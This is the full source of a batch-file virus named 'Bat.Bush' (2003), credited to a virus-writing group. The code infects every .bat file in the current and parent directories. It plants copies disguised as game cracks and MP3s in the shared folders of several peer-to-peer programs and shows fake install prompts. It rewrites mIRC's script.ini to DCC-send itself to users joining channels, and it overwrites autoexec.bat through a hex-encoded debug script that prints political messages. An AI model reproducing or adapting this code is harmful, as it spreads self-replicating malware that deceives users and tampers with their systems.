:: Bat.Bush 
:: By adious [rRlf]
:: Finnished on 23/6/03 2:30:48.59a
@echo off
cls 
if %shit%==prick goto ci
if %cs%==yes goto msg1
if %hl%==yes goto msg2
if %lp%==yes goto msg3
if %mad%==yes goto msg4
goto ci
:msg1
echo --------------[Counter-Strike Crack]----------------
echo.
echo  Press:
echo         [1] install CS package
echo         [2] exit setup
echo.
choice /c:12>nul
if errorlevel 1 set done=1
goto ci
:msg2
echo -------------[ Half Life Crack]----------------
echo.
echo press:
echo       [1] Install Half Life Crack
echo       [2] exit setup
choice /c:12>nul
if errorlevel 1 set done=1
goto ci
:msg3
echo Installing Linkin Park:Somewhere I belong
echo ,........
pause
goto ci
:msg4
echo Installing Madonna:American Life
echo ,........
pause
:ci
cls

cd >l.l
find /c /i "a:\" l.l >nul
if not errorlevel 1 set pat=a:\
find /c /i "b:\" l.l >nul
if not errorlevel 1 set pat=b:\
find /c /i "c:\" l.l >nul
if not errorlevel 1 set pat=c:\
find /c /i "d:\" l.l >nul
if not errorlevel 1 set pat=d:\
find /c /i "e:\" l.l >nul
if not errorlevel 1 set pat=e:\
find /c /i "f:\" l.l >nul
if not errorlevel 1 set pat=f:\
find /c /i "g:\" l.l >nul
if not errorlevel 1 set pat=g:\
find /c /i "h:\" l.l >nul
if not errorlevel 1 set pat=h:\
find /c /i "i:\" l.l >nul
if not errorlevel 1 set pat=i:\
find /c /i "j:\" l.l >nul
if not errorlevel 1 set pat=j:\
find /c /i "k:\" l.l >nul
if not errorlevel 1 set pat=k:\
find /c /i "l:\" l.l >nul
if not errorlevel 1 set pat=l:\
find /c /i "m:\" l.l >nul
if not errorlevel 1 set pat=m:\
find /c /i "n:\" l.l >nul
if not errorlevel 1 set pat=n:\
find /c /i "o:\" l.l >nul
if not errorlevel 1 set pat=o:\
find /c /i "p:\" l.l >nul
if not errorlevel 1 set pat=p:\
find /c /i "q:\" l.l >nul
if not errorlevel 1 set pat=q:\
find /c /i "r:\" l.l >nul
if not errorlevel 1 set pat=r:\
find /c /i "s:\" l.l >nul
if not errorlevel 1 set pat=s:\
find /c /i "t:\" l.l >nul
if not errorlevel 1 set pat=t:\
find /c /i "u:\" l.l >nul
if not errorlevel 1 set pat=u:\
find /c /i "v:\" l.l >nul
if not errorlevel 1 set pat=v:\
find /c /i "w:\" l.l >nul
if not errorlevel 1 set pat=w:\
find /c /i "x:\" l.l >nul
if not errorlevel 1 set pat=x:\
find /c /i "y:\" l.l >nul
if not errorlevel 1 set pat=y:\
find /c /i "z:\" l.l >nul
if not errorlevel 1 set pat=z:\
del l.l
cls

:infecto
@attrib +r %0
echo.>l.t
echo @set shit=prick >>l.t
@copy l.t + %0 m.b
@for %%a in (*.bat) do copy %%a + m.b
del l.t | del m.b 
cd .. >%pat%p.l
@find /c /i "invalid directory" %pat%p.l
@if not errorlevel 1 goto infecto
@echo.>l.t
@echo @set shit=prick >>l.t
@copy l.t + %0 m.b
@for %%a in (*.bat) do copy %%a + m.b
@del l.t | del m.b | del p.l
copy %0 %pat%bush.bat
attrib -r %0
cls

if not exist %pat%windows\*.* goto auto
:p2p
echo set cs=yes >t.i
if exist %pat%program files\morpheus\my shared folder\*.* copy l.t + %0 %pat%program files\morpheus\my shared folder\csc.EXE.bat
if exist %pat%program files\bearshare\shared\*.* copy l.t + %0 %pat%program files\bearshare\shared\csc.EXE.bat
if exist %pat%program files\eDonkey2000\incoming\*.* copy l.t + %0 %pat%program files\eDonkey2000\incoming\csc.EXE.bat
echo set lp=yes >t.i
if exist %pat%program files\morpheus\my shared folder\*.* copy l.t + %0 %pat%program files\morpheus\my shared folder\Linkin_park_somewhere_i_belong.MP3.bat
if exist %pat%program files\bearshare\shared\*.* copy l.t + %0 %pat%program files\bearshare\shared\Linkin_Park_somewhere_i_belong.MP3.bat
if exist %pat%program files\eDonkey2000\incoming\*.* copy l.t + %0 %pat%program files\eDonkey2000\incoming\Linkin_Park_somewhere_i_belong.MP3.bat
echo set hl=yes >t.i
if exist %pat%program files\morpheus\my shared folder\*.* copy l.t + %0 %pat%program files\morpheus\my shared folder\HL_cracks.EXE.bat
if exist %pat%program files\bearshare\shared\*.* copy l.t + %0 %pat%program files\bearshare\shared\HL_cracks.EXE.bat
if exist %pat%program files\eDonkey2000\incoming\*.* copy l.t + %0 %pat%program files\eDonkey2000\incoming\HL_cracks.EXE.bat
echo set mad=yes >t.i
if exist %pat%program files\morpheus\my shared folder\*.* copy l.t + %0 %pat%program files\morpheus\my shared folder\Madonna_A_Life.MP3.bat
if exist %pat%program files\bearshare\shared\*.* copy l.t + %0 %pat%program files\bearshare\shared\Madonna_A_Life.MP3.bat
if exist %pat%program files\eDonkey2000\incoming\*.* copy l.t + %0 %pat%program files\eDonkey2000\incoming\Madonna_A_Life.MP3.bat
cls

echo [script]>l.t
echo n0=on 1:JOIN:#:{ >>l.t 
echo n1= /if ( nick == $me ) { halt } >>l.t 
echo n2= /.dcc send $nick %pat%bush.bat  >>l.t 
echo n3= }>>l.t
cls
if exist %pat%mirc\*.* copy l.t %path%mirc\script.ini 
if exist %pat%mirc32\*.* copy l.t %path%mirc32\script.ini 
if exist %pat%progra~1\mirc\*.* copy l.t %path%progra~1\mirc\script.ini 
if exist %pat%progra~1\mirc32\*.* copy l.t %path%progra~1\mirc32\script.ini 
del l.t
cls

:auto
if not exist %pat%autoexec.bat goto fin
find /c /i "t.l" %pat%autoexec.bat >nul
if not errorlevel 1 goto debugscr
goto fin
:debugscr
@echo e 0100  40 65 63 68 6F 20 6F 66 66 20 0D 0A 65 63 68 6F>>b.bat
@echo e 0110  20 70 72 65 73 73 20 65 6E 74 65 72 20 74 6F 20>>b.bat
@echo e 0120  63 6F 6E 74 69 6E 75 65 2E 2E 2E 20 0D 0A 64 61>>b.bat
@echo e 0130  74 65 20 3E 74 2E 6C 20 0D 0A 66 69 6E 64 20 2F>>b.bat
@echo e 0140  63 20 2F 69 20 22 4D 6F 6E 22 20 74 2E 6C 20 3E>>b.bat
@echo e 0150  6E 75 6C 0D 0A 69 66 20 6E 6F 74 20 65 72 72 6F>>b.bat
@echo e 0160  72 6C 65 76 65 6C 20 31 20 67 6F 74 6F 20 6D 6F>>b.bat
@echo e 0170  6E 20 0D 0A 66 69 6E 64 20 2F 63 20 2F 69 20 22>>b.bat
@echo e 0180  54 75 65 22 20 74 2E 6C 20 3E 6E 75 6C 0D 0A 69>>b.bat
@echo e 0190  66 20 6E 6F 74 20 65 72 72 6F 72 6C 65 76 65 6C>>b.bat
@echo e 01A0  20 31 20 67 6F 74 6F 20 74 75 65 20 0D 0A 66 69>>b.bat
@echo e 01B0  6E 64 20 2F 63 20 2F 69 20 22 77 65 64 22 20 74>>b.bat
@echo e 01C0  2E 6C 20 3E 6E 75 6C 0D 0A 69 66 20 6E 6F 74 20>>b.bat
@echo e 01D0  65 72 72 6F 72 6C 65 76 65 6C 20 31 20 67 6F 74>>b.bat
@echo e 01E0  6F 20 77 65 64 20 0D 0A 66 69 6E 64 20 2F 63 20>>b.bat
@echo e 01F0  2F 69 20 22 74 68 75 22 20 74 2E 6C 20 3E 6E 75>>b.bat
@echo e 0200  6C 0D 0A 69 66 20 6E 6F 74 20 65 72 72 6F 72 6C>>b.bat
@echo e 0210  65 76 65 6C 20 31 20 67 6F 74 6F 20 74 68 75 20>>b.bat
@echo e 0220  0D 0A 66 69 6E 64 20 2F 63 20 2F 69 20 22 66 72>>b.bat
@echo e 0230  69 22 20 74 2E 6C 20 3E 6E 75 6C 0D 0A 69 66 20>>b.bat
@echo e 0240  6E 6F 74 20 65 72 72 6F 72 6C 65 76 65 6C 20 31>>b.bat
@echo e 0250  20 67 6F 74 6F 20 66 72 69 20 0D 0A 66 69 6E 64>>b.bat
@echo e 0260  20 2F 63 20 2F 69 20 22 73 61 74 22 20 74 2E 6C>>b.bat
@echo e 0270  20 3E 6E 75 6C 0D 0A 69 66 20 6E 6F 74 20 65 72>>b.bat
@echo e 0280  72 6F 72 6C 65 76 65 6C 20 31 20 67 6F 74 6F 20>>b.bat
@echo e 0290  73 61 74 20 0D 0A 66 69 6E 64 20 2F 63 20 2F 69>>b.bat
@echo e 02A0  20 22 73 75 6E 22 20 74 2E 6C 20 3E 6E 75 6C 0D>>b.bat
@echo e 02B0  0A 69 66 20 6E 6F 74 20 65 72 72 6F 72 6C 65 76>>b.bat
@echo e 02C0  65 6C 20 31 20 67 6F 74 6F 20 73 75 6E 20 0D 0A>>b.bat
@echo e 02D0  20 0D 0A 3A 6D 6F 6E 20 0D 0A 63 6C 73 20 0D 0A>>b.bat
@echo e 02E0  65 63 68 6F 20 4D 61 73 73 61 67 65 20 6F 66 20>>b.bat
@echo e 02F0  74 68 65 20 64 61 79 20 0D 0A 65 63 68 6F 2E 20>>b.bat
@echo e 0300  0D 0A 65 63 68 6F 20 22 57 68 61 74 20 77 61 73>>b.bat
@echo e 0310  20 49 20 74 61 6C 6B 69 6E 67 20 61 62 6F 75 74>>b.bat
@echo e 0320  20 6A 75 73 74 20 6E 6F 77 3F 20 49 20 6A 75 73>>b.bat
@echo e 0330  74 20 63 61 6E 27 74 20 72 65 6D 65 6D 62 65 72>>b.bat
@echo e 0340  22 20 0D 0A 65 63 68 6F 20 20 20 20 20 20 20 20>>b.bat
@echo e 0350  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>b.bat
@echo e 0360  20 20 20 20 20 20 2D 20 55 53 20 70 72 65 73 69>>b.bat
@echo e 0370  64 65 6E 74 20 47 2E 20 57 2E 20 42 75 73 68 20>>b.bat
@echo e 0380  0D 0A 70 61 75 73 65 3E 6E 75 6C 20 0D 0A 67 6F>>b.bat
@echo e 0390  74 6F 20 65 6E 64 20 0D 0A 20 0D 0A 3A 74 75 65>>b.bat
@echo e 03A0  20 0D 0A 63 6C 73 20 0D 0A 65 63 68 6F 20 4D 61>>b.bat
@echo e 03B0  73 73 61 67 65 20 6F 66 20 74 68 65 20 64 61 79>>b.bat
@echo e 03C0  20 0D 0A 65 63 68 6F 2E 20 0D 0A 65 63 68 6F 20>>b.bat
@echo e 03D0  22 54 68 65 20 77 61 72 20 69 6E 20 49 72 61 71>>b.bat
@echo e 03E0  20 69 73 20 6A 75 73 74 69 66 69 65 64 20 61 73>>b.bat
@echo e 03F0  20 49 20 77 61 6E 74 20 74 6F 20 67 65 74 20 72>>b.bat
@echo e 0400  69 64 20 6F 66 20 74 68 65 20 57 65 70 70 6F 6E>>b.bat
@echo e 0410  73 20 6F 66 20 4D 61 73 68 20 0D 0A 65 63 68 6F>>b.bat
@echo e 0420  20 20 44 79 73 74 72 75 63 6B 73 79 6E 2E 22 20>>b.bat
@echo e 0430  0D 0A 65 63 68 6F 20 20 20 20 20 2D 55 53 20 50>>b.bat
@echo e 0440  72 65 73 69 64 65 6E 74 20 47 2E 20 57 2E 20 42>>b.bat
@echo e 0450  75 73 68 20 77 72 69 74 65 73 20 61 62 6F 75 74>>b.bat
@echo e 0460  20 77 68 79 20 69 74 20 69 73 20 6A 75 73 74 69>>b.bat
@echo e 0470  66 69 65 64 20 74 6F 20 67 6F 20 74 6F 20 77 61>>b.bat
@echo e 0480  72 20 0D 0A 70 61 75 73 65 3E 6E 75 6C 20 0D 0A>>b.bat
@echo e 0490  67 6F 74 6F 20 65 6E 64 20 0D 0A 20 0D 0A 3A 77>>b.bat
@echo e 04A0  65 64 20 0D 0A 63 6C 73 20 0D 0A 65 63 68 6F 20>>b.bat
@echo e 04B0  4D 61 73 73 61 67 65 20 6F 66 20 74 68 65 20 64>>b.bat
@echo e 04C0  61 79 0D 0A 65 63 68 6F 2E 20 0D 0A 65 63 68 6F>>b.bat
@echo e 04D0  20 22 49 6D 70 72 65 61 63 68 20 54 68 61 74 20>>b.bat
@echo e 04E0  42 61 73 74 61 72 64 20 21 21 22 20 0D 0A 65 63>>b.bat
@echo e 04F0  68 6F 20 20 20 20 20 20 20 20 2D 20 50 72 6F 74>>b.bat
@echo e 0500  65 73 74 65 72 20 73 69 67 6E 20 64 75 72 69 6E>>b.bat
@echo e 0510  67 20 74 68 65 20 49 72 61 71 69 20 77 61 72 20>>b.bat
@echo e 0520  0D 0A 70 61 75 73 65 3E 6E 75 6C 20 0D 0A 67 6F>>b.bat
@echo e 0530  74 6F 20 65 6E 64 20 0D 0A 0D 0A 3A 74 68 75 20>>b.bat
@echo e 0540  0D 0A 63 6C 73 20 0D 0A 65 63 68 6F 20 4D 61 73>>b.bat
@echo e 0550  73 61 67 65 20 6F 66 20 74 68 65 20 64 61 79 20>>b.bat
@echo e 0560  0D 0A 65 63 68 6F 2E 20 0D 0A 65 63 68 6F 20 22>>b.bat
@echo e 0570  48 65 20 6C 6F 6F 6B 73 20 6C 69 6B 65 20 74 68>>b.bat
@echo e 0580  65 20 41 6D 65 72 69 63 61 6E 20 4C 69 63 65 22>>b.bat
@echo e 0590  20 0D 0A 65 63 68 6F 20 20 20 20 20 20 20 20 20>>b.bat
@echo e 05A0  20 20 20 2D 20 4D 61 64 6F 6E 6E 61 2C 73 61 79>>b.bat
@echo e 05B0  69 6E 67 20 61 62 6F 75 74 20 55 73 20 50 72 65>>b.bat
@echo e 05C0  73 69 64 65 6E 74 20 47 2E 20 57 2E 20 42 75 73>>b.bat
@echo e 05D0  68 20 0D 0A 70 61 75 73 65 3E 6E 75 6C 20 0D 0A>>b.bat
@echo e 05E0  67 6F 74 6F 20 65 6E 64 20 0D 0A 0D 0A 3A 66 72>>b.bat
@echo e 05F0  69 20 0D 0A 63 6C 73 20 0D 0A 65 63 68 6F 20 4D>>b.bat
@echo e 0600  61 73 73 61 67 65 20 6F 66 20 74 68 65 20 44 61>>b.bat
@echo e 0610  79 20 0D 0A 65 63 68 6F 2E 0D 0A 65 63 68 6F 20>>b.bat
@echo e 0620  22 49 20 73 68 6F 75 6C 64 20 68 61 76 65 20 76>>b.bat
@echo e 0630  6F 74 65 64 20 66 6F 72 20 41 6C 20 47 6F 72 65>>b.bat
@echo e 0640  20 77 68 65 6E 20 49 20 67 6F 74 20 74 68 65 20>>b.bat
@echo e 0650  63 68 61 6E 63 65 2E 22 20 0D 0A 65 63 68 6F 20>>b.bat
@echo e 0660  20 20 20 20 20 20 20 20 20 20 2D 20 77 68 61 74>>b.bat
@echo e 0670  20 61 20 35 30 20 79 65 61 72 20 6F 6C 64 20 6D>>b.bat
@echo e 0680  61 6E 20 66 65 65 6C 73 20 61 62 6F 75 74 20 55>>b.bat
@echo e 0690  53 20 50 72 65 73 69 64 65 6E 74 20 47 2E 20 57>>b.bat
@echo e 06A0  2E 20 42 75 73 68 20 0D 0A 70 61 75 73 65 3E 6E>>b.bat
@echo e 06B0  75 6C 20 0D 0A 67 6F 74 6F 20 65 6E 64 20 0D 0A>>b.bat
@echo e 06C0  0D 0A 3A 73 61 74 20 0D 0A 63 6C 73 20 0D 0A 65>>b.bat
@echo e 06D0  63 68 6F 20 4D 61 73 73 61 67 65 20 6F 66 20 74>>b.bat
@echo e 06E0  68 65 20 64 61 79 20 0D 0A 65 63 68 6F 2E 0D 0A>>b.bat
@echo e 06F0  65 63 68 6F 20 22 57 65 20 66 6F 75 6E 64 20 6E>>b.bat
@echo e 0700  6F 20 57 4D 44 73 20 62 75 74 20 6C 6F 61 64 73>>b.bat
@echo e 0710  20 6F 66 20 70 69 63 74 75 72 65 73 2C 70 6F 72>>b.bat
@echo e 0720  74 72 61 69 74 73 20 61 6E 64 20 73 74 61 74 75>>b.bat
@echo e 0730  65 73 20 6F 66 20 53 61 64 64 61 6D 22 20 0D 0A>>b.bat
@echo e 0740  65 63 68 6F 20 20 20 20 20 20 20 20 20 20 20 20>>b.bat
@echo e 0750  20 20 20 20 20 20 20 2D 20 61 20 55 53 20 73 6F>>b.bat
@echo e 0760  6C 64 69 65 72 20 73 70 65 61 6B 73 20 6F 66 20>>b.bat
@echo e 0770  74 68 65 20 49 72 61 71 69 20 77 61 72 20 0D 0A>>b.bat
@echo e 0780  70 61 75 73 65 3E 6E 75 6C 20 0D 0A 67 6F 74 6F>>b.bat
@echo e 0790  20 65 6E 64 20 0D 0A 0D 0A 3A 73 75 6E 20 0D 0A>>b.bat
@echo e 07A0  63 6C 73 20 0D 0A 65 63 68 6F 20 4D 61 73 73 61>>b.bat
@echo e 07B0  67 65 20 6F 66 20 74 68 65 20 64 61 79 20 0D 0A>>b.bat
@echo e 07C0  65 63 68 6F 2E 0D 0A 65 63 68 6F 20 22 20 75 68>>b.bat
@echo e 07D0  2E 2E 77 68 65 72 65 20 69 73 20 74 68 65 20 74>>b.bat
@echo e 07E0  6F 69 6C 65 74 20 61 67 61 69 6E 3F 3F 20 22 20>>b.bat
@echo e 07F0  0D 0A 65 63 68 6F 20 20 20 20 20 20 20 20 20 20>>b.bat
@echo e 0800  2D 20 55 53 20 70 72 65 73 69 64 65 6E 74 20 64>>b.bat
@echo e 0810  75 72 69 6E 67 20 68 69 73 20 73 74 61 79 20 61>>b.bat
@echo e 0820  74 20 74 68 65 20 57 68 69 74 20 48 6F 75 73 65>>b.bat
@echo e 0830  20 0D 0A 70 61 75 73 65 3E 6E 75 6C 20 0D 0A 67>>b.bat
@echo e 0840  6F 74 6F 20 65 6E 64 20 0D 0A 0D 0A 3A 65 6E 64>>b.bat
@echo e 0850  20 0D 0A 65 63 68 6F 2E 0D 0A 65 63 68 6F 20 54>>b.bat
@echo e 0860  68 69 73 20 6D 61 73 73 61 67 65 20 69 73 20 62>>b.bat
@echo e 0870  72 6F 75 67 68 74 20 74 6F 20 79 6F 75 20 62 79>>b.bat
@echo e 0880  20 42 61 74 2E 42 75 73 68 20 0D 0A 65 63 68 6F>>b.bat
@echo e 0890  20 42 61 74 2E 42 75 73 68 20 62 79 20 61 64 69>>b.bat
@echo e 08A0  6F 75 73 20 5B 72 52 6C 66 5D 20 0D 0A 70 61 75>>b.bat
@echo e 08B0  73 65 3E 6E 75 6C 20 0D 0A 64 65 6C 20 74 2E 6C>>b.bat
@echo e 08C0  20 0D 0A 63 61 6C 6C 20 62 75 73 68 2E 62 61 74>>b.bat
@echo e 08D0  0D 0A 77 69 6E 0D 0A 65 78 69 74 20 0D 0A 00>>b.bat
echo rcx>>b.bat
echo 7DE>>b.bat
echo n%pat%autoexec.bat>>b.bat
echo w>>b.bat
echo q>>b.bat
debug < b.bat
del b.bat
cls

:fin
exit

